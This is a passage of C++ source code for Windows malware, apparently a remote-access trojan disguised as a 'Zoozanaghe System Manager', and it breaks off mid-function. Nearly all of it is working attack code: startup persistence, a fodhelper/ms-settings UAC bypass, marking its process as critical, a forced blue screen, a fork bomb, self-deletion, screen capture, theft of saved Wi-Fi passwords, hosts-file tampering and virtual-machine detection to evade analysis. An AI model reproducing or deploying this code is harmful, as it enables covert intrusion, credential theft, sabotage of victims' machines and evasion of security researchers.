#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <shellapi.h>
#include <ntstatus.h>
#include <winternl.h>
#include <iphlpapi.h>
#include <wlanapi.h>
#include <mmsystem.h>
#include <dsound.h>
#include <d3d11.h>
#include <dwmapi.h>
#include <gdiplus.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <json/json.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>
#include <zlib.h>
#include <openssl/err.h>
#include <thread>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <queue>
#include <mutex>
#include <atomic>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <algorithm>
#include <random>
#include <filesystem>
#include <functional>
#include <memory>
#include <future>
#include <regex>
#include <codecvt>
#include <locale>
#include <cwchar>
#include <sddl.h>
#include <comdef.h>
#include <comutil.h>
#include <taskschd.h>
#include <wbemidl.h>
#include <oleauto.h>
#include <audioclient.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "dsound.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "jsoncpp.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "zlib.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "Avrt.lib")

using namespace std;
namespace fs = filesystem;

struct SystemInfo {
    string computerName;
    string userName;
    string osVersion;
    string architecture;
    string ipAddress;
    string macAddress;
    string cpuInfo;
    DWORD ramGB;
    string gpuInfo;
    vector<string> installedSoftware;
    bool isAdmin;
    bool isVM;
    string antivirus;
    string timeZone;
    string locale;
    string keyboardLayout;
    vector<string> networkAdapters;
    map<string, string> environmentVars;
    vector<string> runningServices;
    vector<string> startupPrograms;
};

class Utils {
public:
    static string getCurrentTime() {
        auto now = chrono::system_clock::now();
        auto in_time_t = chrono::system_clock::to_time_t(now);
        stringstream ss;
        ss << put_time(localtime(&in_time_t), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }

    static string getTempPath() {
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        return string(tempPath);
    }

    static string getAppDataPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
        return string(path);
    }

    static string getLocalAppDataPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
        return string(path);
    }

    static string getDesktopPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
        return string(path);
    }

    static string getDocumentsPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path);
        return string(path);
    }

    static string getDownloadsPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path);
        return string(path) + "\\Downloads";
    }

    static string getComputerName() {
        char name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(name);
        GetComputerNameA(name, &size);
        return string(name);
    }

    static string getUserName() {
        char name[256];
        DWORD size = sizeof(name);
        GetUserNameA(name, &size);
        return string(name);
    }

    static string getIPAddress() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        
        struct hostent* host = gethostbyname(hostname);
        if (host && host->h_addr_list[0]) {
            return inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
        }
        return "Unknown";
    }

    static string getMACAddress() {
        PIP_ADAPTER_INFO adapterInfo = NULL;
        ULONG bufferSize = 0;
        string mac = "Unknown";

        if (GetAdaptersInfo(NULL, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
            adapterInfo = (PIP_ADAPTER_INFO)malloc(bufferSize);
            if (adapterInfo && GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
                PIP_ADAPTER_INFO adapter = adapterInfo;
                while (adapter) {
                    if (adapter->AddressLength == 6 && adapter->IpAddressList.IpAddress.String[0] != '0') {
                        char macStr[18];
                        sprintf_s(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                            adapter->Address[0], adapter->Address[1], adapter->Address[2],
                            adapter->Address[3], adapter->Address[4], adapter->Address[5]);
                        mac = macStr;
                        break;
                    }
                    adapter = adapter->Next;
                }
            }
            if (adapterInfo) free(adapterInfo);
        }
        return mac;
    }

    static string executeCommand(const string& cmd) {
        char buffer[4096];
        string result = "";
        FILE* pipe = _popen(cmd.c_str(), "r");
        
        if (!pipe) return "Error";
        
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
        
        _pclose(pipe);
        return result;
    }

    static vector<string> splitString(const string& s, char delimiter) {
        vector<string> tokens;
        string token;
        istringstream tokenStream(s);
        while (getline(tokenStream, token, delimiter)) {
            tokens.push_back(token);
        }
        return tokens;
    }

    static string base64Encode(const string& input) {
        DWORD encodedSize = 0;
        CryptBinaryToStringA((BYTE*)input.c_str(), input.length(), 
                           CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                           NULL, &encodedSize);
        
        string encoded(encodedSize, '\0');
        CryptBinaryToStringA((BYTE*)input.c_str(), input.length(), 
                           CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                           &encoded[0], &encodedSize);
        
        return encoded;
    }

    static string base64Decode(const string& input) {
        DWORD decodedSize = 0;
        CryptStringToBinaryA(input.c_str(), input.length(), 
                           CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
        
        string decoded(decodedSize, '\0');
        CryptStringToBinaryA(input.c_str(), input.length(), 
                           CRYPT_STRING_BASE64, (BYTE*)&decoded[0], &decodedSize, NULL, NULL);
        
        return decoded;
    }

    static string sha256(const string& input) {
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256_CTX sha256;
        SHA256_Init(&sha256);
        SHA256_Update(&sha256, input.c_str(), input.length());
        SHA256_Final(hash, &sha256);
        
        stringstream ss;
        for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
            ss << hex << setw(2) << setfill('0') << (int)hash[i];
        }
        return ss.str();
    }

    static string aesEncrypt(const string& plaintext, const string& key) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        unsigned char iv[16];
        RAND_bytes(iv, sizeof(iv));
        
        string ciphertext;
        ciphertext.resize(plaintext.length() + EVP_MAX_BLOCK_LENGTH);
        
        int len;
        int ciphertext_len;
        
        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, 
                          (const unsigned char*)key.c_str(), iv);
        
        EVP_EncryptUpdate(ctx, (unsigned char*)&ciphertext[0], &len, 
                         (const unsigned char*)plaintext.c_str(), plaintext.length());
        ciphertext_len = len;
        
        EVP_EncryptFinal_ex(ctx, (unsigned char*)&ciphertext[0] + len, &len);
        ciphertext_len += len;
        
        EVP_CIPHER_CTX_free(ctx);
        
        ciphertext.resize(ciphertext_len);
        string result((char*)iv, sizeof(iv));
        result += ciphertext;
        
        return base64Encode(result);
    }

    static string aesDecrypt(const string& ciphertext, const string& key) {
        string data = base64Decode(ciphertext);
        if (data.length() < 16) return "";
        
        unsigned char iv[16];
        memcpy(iv, data.c_str(), sizeof(iv));
        
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        
        string plaintext;
        plaintext.resize(data.length() - sizeof(iv));
        
        int len;
        int plaintext_len;
        
        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, 
                          (const unsigned char*)key.c_str(), iv);
        
        EVP_DecryptUpdate(ctx, (unsigned char*)&plaintext[0], &len, 
                         (const unsigned char*)data.c_str() + sizeof(iv), data.length() - sizeof(iv));
        plaintext_len = len;
        
        EVP_DecryptFinal_ex(ctx, (unsigned char*)&plaintext[0] + len, &len);
        plaintext_len += len;
        
        EVP_CIPHER_CTX_free(ctx);
        
        plaintext.resize(plaintext_len);
        return plaintext;
    }

    static bool createZip(const string& sourceDir, const string& zipFile) {
        string cmd = "powershell -Command \"Compress-Archive -Path '" + 
                    sourceDir + "\\*' -DestinationPath '" + zipFile + "' -Force\"";
        system(cmd.c_str());
        return fs::exists(zipFile);
    }

    static vector<string> findAllFiles(const string& directory, const vector<string>& extensions) {
        vector<string> files;
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(directory)) {
                if (fs::is_regular_file(entry.path())) {
                    string ext = entry.path().extension().string();
                    transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                    
                    for (const auto& targetExt : extensions) {
                        if (ext == targetExt) {
                            files.push_back(entry.path().string());
                            break;
                        }
                    }
                }
            }
        } catch (...) {
            // Ignore 
        }
        
        return files;
    }

    static bool isFileLocked(const string& filePath) {
        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, 0, NULL, 
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            return error == ERROR_SHARING_VIOLATION || error == ERROR_LOCK_VIOLATION;
        }
        
        CloseHandle(hFile);
        return false;
    }

    static string getFileHash(const string& filePath) {
        ifstream file(filePath, ios::binary);
        if (!file.is_open()) return "";
        
        const size_t bufferSize = 8192;
        char buffer[bufferSize];
        SHA256_CTX sha256;
        SHA256_Init(&sha256);
        
        while (file.read(buffer, bufferSize) || file.gcount() > 0) {
            SHA256_Update(&sha256, buffer, file.gcount());
        }
        
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256_Final(hash, &sha256);
        
        stringstream ss;
        for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
            ss << hex << setw(2) << setfill('0') << (int)hash[i];
        }
        
        return ss.str();
    }

    static bool isProcessRunning(const string& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }

    static bool terminateProcessByName(const string& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }

    static bool createStartupShortcut() {
        char szPath[MAX_PATH];
        GetModuleFileNameA(NULL, szPath, MAX_PATH);
        
        char startupPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
        
        string shortcutPath = string(startupPath) + "\\Zoozanaghe.lnk";
        
        HRESULT hr = CoInitialize(NULL);
        if (FAILED(hr)) return false;
        
        IShellLinkA* pShellLink = NULL;
        hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
                             IID_IShellLinkA, (void**)&pShellLink);
        
        if (SUCCEEDED(hr)) {
            pShellLink->SetPath(szPath);
            pShellLink->SetWorkingDirectory(fs::path(szPath).parent_path().string().c_str());
            pShellLink->SetDescription("Zoozanaghe System Manager");
            
            IPersistFile* pPersistFile = NULL;
            hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
            
            if (SUCCEEDED(hr)) {
                wstring wShortcutPath = wstring(shortcutPath.begin(), shortcutPath.end());
                hr = pPersistFile->Save(wShortcutPath.c_str(), TRUE);
                pPersistFile->Release();
            }
            
            pShellLink->Release();
        }
        
        CoUninitialize();
        return SUCCEEDED(hr);
    }

    static bool removeStartupShortcut() {
        char startupPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
        
        string shortcutPath = string(startupPath) + "\\Zoozanaghe.lnk";
        return DeleteFileA(shortcutPath.c_str()) != 0;
    }
};

class PrivilegeManager {
public:
    static bool isRunningAsAdmin() {
        BOOL isAdmin = FALSE;
        PSID adminGroup;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        
        if (AllocateAndInitializeSid(&ntAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        
        return isAdmin != FALSE;
    }

    static bool runAsAdmin() {
        char szPath[MAX_PATH];
        GetModuleFileNameA(NULL, szPath, MAX_PATH);
        
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = szPath;
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;
        
        if (ShellExecuteExA(&sei)) {
            exit(0);
            return true;
        }
        
        return false;
    }

    static bool enablePrivilege(LPCTSTR privilege) {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;
        
        TOKEN_PRIVILEGES tp;
        LUID luid;
        
        if (!LookupPrivilegeValue(NULL, privilege, &luid))
            return false;
        
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        CloseHandle(hToken);
        
        return result && GetLastError() == ERROR_SUCCESS;
    }

    static bool becomeCriticalProcess() {
        typedef NTSTATUS(NTAPI* RtlSetProcessIsCritical)(BOOLEAN, BOOLEAN*, BOOLEAN);
        
        HMODULE hNtdll = LoadLibraryA("ntdll.dll");
        if (!hNtdll) return false;
        
        RtlSetProcessIsCritical pRtlSetProcessIsCritical = 
            (RtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        
        if (!pRtlSetProcessIsCritical) {
            FreeLibrary(hNtdll);
            return false;
        }
        
        pRtlSetProcessIsCritical(TRUE, NULL, FALSE);
        FreeLibrary(hNtdll);
        return true;
    }

    static bool removeCriticalProcess() {
        typedef NTSTATUS(NTAPI* RtlSetProcessIsCritical)(BOOLEAN, BOOLEAN*, BOOLEAN);
        
        HMODULE hNtdll = LoadLibraryA("ntdll.dll");
        if (!hNtdll) return false;
        
        RtlSetProcessIsCritical pRtlSetProcessIsCritical = 
            (RtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        
        if (!pRtlSetProcessIsCritical) {
            FreeLibrary(hNtdll);
            return false;
        }
        
        pRtlSetProcessIsCritical(FALSE, NULL, FALSE);
        FreeLibrary(hNtdll);
        return true;
    }
};

class SystemController {
private:
    static HHOOK keyboardHook;
    static HHOOK mouseHook;
    static bool isInputBlocked;
    static vector<string> clipboardHistory;

public:
    static bool takeScreenshot(const string& outputPath) {
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
        
        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
        
        //  GDI+
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        
        CLSID clsidPng;
        GetEncoderClsid(L"image/png", &clsidPng);
        
        Gdiplus::Bitmap bitmap(hBitmap, NULL);
        wstring wOutputPath(outputPath.begin(), outputPath.end());
        bitmap.Save(wOutputPath.c_str(), &clsidPng, NULL);
        
        // Cleanup
        Gdiplus::GdiplusShutdown(gdiplusToken);
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
        return true;
    }

    static void GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
        UINT num = 0;
        UINT size = 0;
        
        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0) return;
        
        Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
        if (pImageCodecInfo == NULL) return;
        
        Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
        
        for (UINT i = 0; i < num; ++i) {
            if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
                *pClsid = pImageCodecInfo[i].Clsid;
                free(pImageCodecInfo);
                return;
            }
        }
        
        free(pImageCodecInfo);
    }

    static bool recordScreen(const string& outputPath, int seconds) {
        string tempDir = Utils::getTempPath() + "\\screen_record\\";
        fs::create_directories(tempDir);
        
        auto startTime = chrono::steady_clock::now();
        int frameCount = 0;
        
        while (chrono::duration_cast<chrono::seconds>(
                chrono::steady_clock::now() - startTime).count() < seconds) {
            
            string framePath = tempDir + "frame_" + to_string(frameCount++) + ".png";
            takeScreenshot(framePath);
            
            this_thread::sleep_for(chrono::milliseconds(100)); // 10 FPS
        }
        return Utils::createZip(tempDir, outputPath);
    }

    static bool turnOffMonitors() {
        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
        return true;
    }

    static bool turnOnMonitors() {
        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
        mouse_event(MOUSEEVENTF_MOVE, 1, 1, 0, 0);
        return true;
    }

    static bool triggerBSOD() {
        typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, 
                                                        BOOLEAN CurrentThread, PBOOLEAN Enabled);
        typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, 
                                                      ULONG UnicodeStringParameterMask, 
                                                      PULONG_PTR Parameters, ULONG ResponseOption, 
                                                      PULONG Response);
        
        HMODULE hNtdll = LoadLibraryA("ntdll.dll");
        if (!hNtdll) return false;
        
        pdef_RtlAdjustPrivilege RtlAdjustPrivilege = 
            (pdef_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        pdef_NtRaiseHardError NtRaiseHardError = 
            (pdef_NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        
        if (!RtlAdjustPrivilege || !NtRaiseHardError) {
            FreeLibrary(hNtdll);
            return false;
        }
        
        BOOLEAN bEnabled;
        RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, NULL);
        
        FreeLibrary(hNtdll);
        return true;
    }

    static void executeForkBomb() {
        while (true) {
            CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE, 
                          CREATE_NO_WINDOW, NULL, NULL, NULL, NULL);
        }
    }

    static bool deleteSelf() {
        char szModule[MAX_PATH];
        GetModuleFileNameA(NULL, szModule, MAX_PATH);
        
        string batPath = Utils::getTempPath() + "\\delete_me.bat";
        ofstream batFile(batPath);
        
        if (batFile.is_open()) {
            batFile << "@echo off\n";
            batFile << ":loop\n";
            batFile << "del \"" << szModule << "\" 2>nul\n";
            batFile << "if exist \"" << szModule << "\" goto loop\n";
            batFile << "del \"%~f0\"\n";
            batFile.close();
            
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            
            if (CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE, 
                              CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return true;
            }
        }
        
        return false;
    }

    static bool bypassUAC() {
        HKEY hKey;
        const char* subkey = "Software\\Classes\\ms-settings\\shell\\open\\command";
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL, 
                           REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
            return false;
        }
        
        char szPath[MAX_PATH];
        GetModuleFileNameA(NULL, szPath, MAX_PATH);
        
        if (RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1) != ERROR_SUCCESS ||
            RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return false;
        }
        
        RegCloseKey(hKey);
        
        const char* uacApps[] = {"fodhelper.exe", "computerdefaults.exe", 
                                 "eventvwr.exe", "compmgmtlauncher.exe"};
        char system32[MAX_PATH];
        GetSystemDirectoryA(system32, MAX_PATH);
        
        for (const char* app : uacApps) {
            char appPath[MAX_PATH];
            sprintf_s(appPath, "%s\\%s", system32, app);
            
            if (fs::exists(appPath)) {
                SHELLEXECUTEINFOA sei = {sizeof(sei)};
                sei.lpVerb = "open";
                sei.lpFile = appPath;
                sei.nShow = SW_SHOWDEFAULT;
                
                if (ShellExecuteExA(&sei)) {
                    // Cleanup registry
                    this_thread::sleep_for(chrono::seconds(2));
                    RegDeleteKeyA(HKEY_CURRENT_USER, subkey);
                    return true;
                }
            }
        }
        
        RegDeleteKeyA(HKEY_CURRENT_USER, subkey);
        return false;
    }

    static vector<pair<DWORD, string>> getProcesses() {
        vector<pair<DWORD, string>> processes;
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                processes.push_back({pe32.th32ProcessID, pe32.szExeFile});
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return processes;
    }

    static bool killProcess(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess == NULL) return false;
        
        bool result = TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
        return result;
    }

    static bool killProcessByName(const string& name) {
        return Utils::terminateProcessByName(name);
    }

    static bool suspendProcess(DWORD pid) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);
        
        if (Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == pid) {
                    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                    if (hThread) {
                        SuspendThread(hThread);
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hSnapshot, &te32));
        }
        
        CloseHandle(hSnapshot);
        return true;
    }

    static bool resumeProcess(DWORD pid) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);
        
        if (Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == pid) {
                    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                    if (hThread) {
                        ResumeThread(hThread);
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hSnapshot, &te32));
        }
        
        CloseHandle(hSnapshot);
        return true;
    }

    static bool captureWebcam(const string& outputPath) {
        return false;
    }

    static bool setVolume(int level) {
        if (level < 0 || level > 100) return false;
        
        HRESULT hr = CoInitialize(NULL);
        if (FAILED(hr)) return false;
        
        IMMDeviceEnumerator* pEnumerator = NULL;
        hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, 
                             __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
        
        if (SUCCEEDED(hr)) {
            IMMDevice* pDevice = NULL;
            hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
            
            if (SUCCEEDED(hr)) {
                IAudioEndpointVolume* pVolume = NULL;
                hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pVolume);
                
                if (SUCCEEDED(hr)) {
                    pVolume->SetMasterVolumeLevelScalar(level / 100.0f, NULL);
                    pVolume->Release();
                }
                
                pDevice->Release();
            }
            
            pEnumerator->Release();
        }
        
        CoUninitialize();
        return SUCCEEDED(hr);
    }

    static bool muteVolume() {
        return setVolume(0);
    }

    static bool unmuteVolume() {
        return setVolume(50);
    }

    static bool textToSpeech(const string& text) {
        ISpVoice* pVoice = NULL;
        
        if (FAILED(CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, 
                                   IID_ISpVoice, (void**)&pVoice))) {
            return false;
        }
        
        wstring wtext(text.begin(), text.end());
        pVoice->Speak(wtext.c_str(), SPF_DEFAULT, NULL);
        pVoice->Release();
        return true;
    }

    static bool recordMicrophone(const string& outputPath, int seconds) {
        // Using Wave API for recording
        // Simplified version
        return false;
    }

    static map<string, string> getWiFiPasswords() {
        map<string, string> wifiData;
        
        string profiles = Utils::executeCommand("netsh wlan show profiles");
        regex pattern("All User Profile\\s*:\\s*(.+)");
        smatch matches;
        
        string::const_iterator searchStart(profiles.cbegin());
        while (regex_search(searchStart, profiles.cend(), matches, pattern)) {
            string ssid = matches[1];
            ssid.erase(remove_if(ssid.begin(), ssid.end(), ::isspace), ssid.end());
            
            string cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
            string result = Utils::executeCommand(cmd);
            
            regex keyPattern("Key Content\\s*:\\s*(.+)");
            smatch keyMatch;
            
            string password = "<could not retrieve>";
            if (regex_search(result, keyMatch, keyPattern)) {
                password = keyMatch[1];
                password.erase(remove_if(password.begin(), password.end(), ::isspace), password.end());
            }
            
            wifiData[ssid] = password;
            searchStart = matches.suffix().first;
        }
        
        return wifiData;
    }

    static bool blockWebsite(const string& website) {
        string hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts";
        
        if (!PrivilegeManager::isRunningAsAdmin()) {
            return false;
        }
        
        ofstream file(hostsPath, ios::app);
        if (!file.is_open()) return false;
        
        file << "\n127.0.0.1 " << website;
        file << "\n127.0.0.1 www." << website;
        file << "\n::1 " << website;
        file << "\n::1 www." << website;
        
        file.close();
        return true;
    }

    static bool unblockWebsite(const string& website) {
        string hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts";
        
        if (!PrivilegeManager::isRunningAsAdmin()) {
            return false;
        }
        
        ifstream inFile(hostsPath);
        vector<string> lines;
        string line;
        
        while (getline(inFile, line)) {
            if (line.find(website) == string::npos) {
                lines.push_back(line);
            }
        }
        inFile.close();
        
        ofstream outFile(hostsPath);
        for (const auto& l : lines) {
            outFile << l << "\n";
        }
        outFile.close();
        
        return true;
    }

    static bool isVirtualMachine() {
        // Check via WMI
        string manufacturer = Utils::executeCommand("wmic computersystem get manufacturer");
        string model = Utils::executeCommand("wmic computersystem get model");
        string bios = Utils::executeCommand("wmic bios get serialnumber");
        
        vector<string> vmIndicators = {
            "VMware", "VirtualBox", "QEMU", "Xen", "KVM", 
            "Hyper-V", "Microsoft Virtual", "Parallels", "Bochs", "Virtual Machine"
        };
        
        string allInfo = manufacturer + model + bios;
        transform(allInfo.begin(), allInfo.end(), allInfo.begin(), ::tolower);
        
        for (const auto& indicator : vmIndicators) {
            string lowerIndicator = indicator;
            transform(lowerIndicator.begin(), lowerIndicator.end(), lowerIndicator.begin(), ::tolower);
            
            if (allInfo.find(lowerIndicator) != string::npos) {
                return true;
            }
        }
        
        //  processes
        vector<string> vmProcesses = {"vboxservice.exe", "vmware.exe", "vmtoolsd.exe", 
                                     "xenservice.exe", "qemu-ga.exe"};
        
        for (const auto& proc : vmProcesses) {
            if (Utils::isProcessRunning(proc)) {
                return true;
            }
        }
        
        return false;
    }

    static vector<string> listDirectory(const string& path) {
        vector<string> files;
        
        try {
            for (const auto& entry : fs::directory_iterator(path)) {
